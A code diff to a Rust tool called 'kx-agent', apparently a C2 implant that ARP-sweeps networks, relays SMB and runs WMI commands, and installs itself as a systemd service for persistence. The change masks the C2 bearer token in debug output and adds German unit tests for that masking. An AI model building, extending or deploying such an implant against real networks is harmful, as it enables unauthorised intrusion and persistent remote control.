@@ -13,6 +13,42 @@ use std::net::Ipv4Addr;
 use clap::Parser;
 use tracing::{error, info};
 
+/// Bearer-Token, dessen Debug-Ausgabe den Wert maskiert.
+///
+/// Der Agent gibt seine Argumentstruktur im Debug-Output aus. Ein reiner
+/// `String` käme dabei im Klartext in die Konsole und in die Log-Dateien.
+/// Der eigene Typ verhindert das strukturell: er lässt sich nur über
+/// [`Secret::as_str`] als Text lesen, und seine `Debug`-Ausgabe ist maskiert.
+#[derive(Clone)]
+struct Secret(String);
+
+impl Secret {
+    /// Der Token im Klartext — nur für die Verwendung als Zugangsdaten.
+    fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
+impl std::fmt::Debug for Secret {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str("***")
+    }
+}
+
+impl std::str::FromStr for Secret {
+    type Err = std::convert::Infallible;
+
+    fn from_str(s: &str) -> Result<Self, Self::Err> {
+        Ok(Secret(s.to_string()))
+    }
+}
+
+impl From<&str> for Secret {
+    fn from(s: &str) -> Self {
+        Secret(s.to_string())
+    }
+}
+
 /// Agent-Konfiguration aus CLI/Umgebung.
 #[derive(Parser, Debug)]
 #[command(name = "kx-agent", about = "Kx-autonomer Agent")]
@@ -22,7 +58,7 @@ struct Args {
     server: String,
     /// Bearer-Token für den C2-Server.
     #[arg(long, env = "KX_C2_TOKEN")]
-    token: String,
+    token: Secret,
     /// Netzwerkschnittstelle für den ARP-Sweep.
     #[arg(long, default_value = "eth0")]
     iface: String,
@@ -65,7 +101,7 @@ async fn main() {
     let own_ip: Ipv4Addr = args.own_ip.parse().expect("Ungültige eigene IP");
     let host_id = own_ip.to_string();
 
-    let client = match c2::C2Client::new(&args.server, &args.token, &args.server_cert) {
+    let client = match c2::C2Client::new(&args.server, args.token.as_str(), &args.server_cert) {
         Ok(c) => c,
         Err(e) => {
             error!("C2-Client-Initialisierung fehlgeschlagen: {e}");
@@ -262,10 +298,51 @@ async fn install_persistence(args: &Args) -> Result<(), Box<dyn std::error::Erro
             ],
             env: vec![
                 ("KX_C2_URL".to_string(), args.server.clone()),
-                ("KX_C2_TOKEN".to_string(), args.token.clone()),
+                ("KX_C2_TOKEN".to_string(), args.token.as_str().to_string()),
             ],
         };
         kx_posix::install_systemd_service(&svc).await?;
     }
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn args_mit_token(token: &str) -> Args {
+        Args {
+            server: "https://127.0.0.1:8443".to_string(),
+            token: Secret::from(token),
+            iface: "eth0".to_string(),
+            start: "10.0.0.1".to_string(),
+            end: "10.0.0.2".to_string(),
+            own_ip: "10.0.0.3".to_string(),
+            hosts: None,
+            relay_script: "smbrelayx.py".to_string(),
+            wmi_script: "wmiexec.py".to_string(),
+            server_cert: "/tmp/server.pem".to_string(),
+        }
+    }
+
+    #[test]
+    fn debug_ausgabe_der_argumente_zeigt_kein_token() {
+        let args = args_mit_token("hochgeheim-1234");
+        let ausgabe = format!("{args:?}");
+
+        assert!(
+            !ausgabe.contains("hochgeheim-1234"),
+            "die Debug-Ausgabe enthält das Token im Klartext: {ausgabe}"
+        );
+        assert!(
+            ausgabe.contains("***"),
+            "die Debug-Ausgabe maskiert das Token nicht: {ausgabe}"
+        );
+    }
+
+    #[test]
+    fn token_bleibt_als_text_lesbar() {
+        let args = args_mit_token("hochgeheim-1234");
+        assert_eq!(args.token.as_str(), "hochgeheim-1234");
+    }
 }
